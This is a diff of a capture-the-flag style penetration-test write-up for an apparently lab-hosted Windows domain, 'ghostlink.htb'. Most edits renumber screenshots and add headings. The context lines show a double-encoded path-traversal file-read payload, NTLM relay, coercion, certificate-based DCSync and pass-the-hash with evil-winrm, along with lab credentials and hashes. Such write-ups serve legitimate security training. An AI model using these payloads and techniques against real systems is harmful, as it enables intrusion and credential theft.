@@ -373,6 +373,7 @@ enumerating gogs
 
 ![](./screens/gogs1.png)
 
+
 ![](./screens/gogs2.png)
 
 ![](./screens/gogs3.png)
@@ -409,7 +410,7 @@ CVE-2025-8110 (RCE authenticated - Gravità Alta/Critica)
 
 Enumerating gpz-op26-secure.ghostlink.htb presents a login form
 
-![](./screens/3.png)
+![](./screens/1.png)
 
 ## Bypassing the login with NTLM relay
 
@@ -523,7 +524,7 @@ editing config.py
 nano lib/relay/utils/config.py 
 ```
 
-![](./screens/5.png)
+![](./screens/2.png)
 
 # Summary
 
@@ -629,15 +630,15 @@ Protocol  Target                         Username              AdminStatus  Port
 HTTP      gpz-op26-secure.ghostlink.htb  GHOSTLINK/SVC_CANARY  N/A          80  
 ```
 
-![](./screens/6.png)
+![](./screens/3.png)
 
 configuring burp to tunnel through the proxy and test the enpoints
 
 ![](./screens/burp.png)
 
-![](./screens/7.png)
+![](./screens/4.png)
 
-![](./screens/9.png)
+![](./screens/5.png)
 
 fix the bug
 
@@ -676,11 +677,11 @@ python
         senddata = EOL.join(response)
 ```
 
-![](./screens/10.png)
+![](./screens/6.png)
 
 testing the /api/download endpoint
 
-![](./screens/11.png)
+![](./screens/7.png)
 
 ## LFI
 
@@ -690,7 +691,7 @@ a double url encoding payload grants file read on the system:
 GET /api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569 HTTP/1.1
 ```
 
-![](./screens/12.png)
+![](./screens/8.png)
 
 
 we're authenticated as the
@@ -706,7 +707,7 @@ GET
 256e%2561%2572%2579%255c%256e%2574%2575%2573%2565%2572%252e%2564%2561%2574 HTTP/1.1
 ```
 
-![](./screens/13.png)
+![](./screens/9.png)
 
 downloading ntuser.dat:
 
@@ -814,7 +815,7 @@ Archive:  db.zip
 
 opening the db with the key provided discloses a password for the user vroth on the gogs dashboard
 
-![](./screens/14.png)
+![](./screens/1.png)
 
 vroth:mOo03jpsqx8JQYMBwvFP
 
@@ -1223,7 +1224,8 @@ coercer coerce -l 10.10.14.148 -t dc01.ghostlink.htb -d ghostlink.htb -u nvirell
 
 ```
 
-impe
+impersonating the domain controller leads to a DCSYnc:
+
 ```
 certipy-ad auth -pfx DC01.pfx -dc-ip 10.129.191.32
 Certipy v5.1.0 - by Oliver Lyak (ly4k)
@@ -1258,6 +1260,7 @@ Administrator:0x17:8190e067f478002ddd63eb209b016696
 
 ```
 
+## Root flag 
 ```
 evil-winrm -i ghostlink.htb -u administrator -H 8190e067f478002ddd63eb209b016696
                                         
@@ -1279,6 +1282,10 @@ ebe6de5acd30469507826e1c1f8a3563
 ```
 
 ---
+
+## Key takeaways 
+
+Put here the important concepts for a pentester/red teamer learned in this machine, which can be replicable in other scenarios
 ## Remediation
 
 - Key takeaway 1
